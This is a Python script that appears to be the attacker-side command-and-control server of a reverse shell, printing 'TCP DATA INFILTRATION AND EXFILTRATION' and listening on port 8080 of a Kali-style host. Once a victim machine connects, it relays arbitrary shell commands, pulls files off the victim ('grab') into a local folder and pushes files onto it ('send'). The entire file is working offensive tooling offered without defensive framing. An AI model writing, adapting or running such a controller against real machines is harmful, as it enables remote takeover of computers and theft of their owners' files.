import os
import socket
import banner


def doGrab(conn, command, operation):
    conn.send(command.encode())
    if (operation == "grab"):
        grab, sourcePathAsFileName = command.split("*")
        path = "/home/kali/GrabbedFiles/"
        fileName = "grabbed_" + sourcePathAsFileName

    f = open(path + fileName, 'wb')
    while True:
        bits = conn.recv(5000)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+] Transfer completed ')
            break
        if 'File not found'.encode() in bits:
            print('[-] File not found')
            break
        f.write(bits)
    print("File name: " + fileName)
    print("Written to: " + path)

def doSend(conn, sourcePath, destinationPath, fileName):
    # for send operation, open the file in the read mode
    # Read the file into packets and send them through connection object
    # After finished sending the whole file, send string 'DONE' to indicate the completion.
    if os.path.exists(sourcePath + fileName):
        sourceFile = open(sourcePath + fileName, 'rb')
        packet = sourceFile.read(5000)
        while len(packet) > 0:
            conn.send(packet)
            packet = sourceFile.read(5000)
        conn.send('DONE'.encode())
        print('[+] Transfer completed ')
    else:
        conn.send('File not found'.encode())
        print('[-] Unable to find the file')
        return


def connect():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.229.131", 8080))
    s.listen(1)
    print("=" * 60)
    print(" TCP DATA INFILTRATION AND EXFILTRATION")
    print("=" * 60)
    print('[+] Listening for income TCP connection on port 8080')
    conn, addr = s.accept()
    print('[+] We got a connection from', addr)

    while True:
        print("=" * 60)
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            break

        # command format: grab*<File Path>
        # example: grab*C:\Users\John\Desktop\photo.jpeg
        elif 'grab' in command:
            doGrab(conn, command, "grab")

        # Command format: send*<Destination path>*<File Name>
        # example: send*C:\Users\John\Desktop\*photo.jpeg
        # source file in Linux. Example: /root/Desktop/
        elif 'send' in command:
            sendCmd, destination, fileName = command.split("*")
            source = input("source path: ")
            conn.send(command.encode())
            doSend(conn, source, destination, fileName)

        else:
            conn.send(command.encode())
            print(conn.recv(5000).decode())

def main():
    connect()
main()